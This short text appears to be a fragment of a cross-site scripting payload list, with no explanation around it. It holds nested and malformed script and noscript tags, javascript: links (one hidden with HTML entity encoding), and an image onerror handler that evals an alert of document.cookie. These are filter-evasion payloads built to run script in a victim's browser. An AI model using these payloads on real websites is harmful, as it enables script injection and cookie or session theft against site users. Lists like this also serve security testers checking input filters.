<output>
<noscript onerror=prompt(0);><a href="javascript:alert("XSS")>XSS</a>"><script onerror="<noscript onerror="<script>alert("XSS")</script>"><IMG src=<script src="/">alert(" "XSS" ")</script></noscript>"<script>alert("XSS")</script></noscript>
</output>
<a href="javascript&colon;alert&lpar;document&period;domain&rpar;">Click Here</a>

<img src=x onerror="eval('alert(document.cookie)')"/>
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
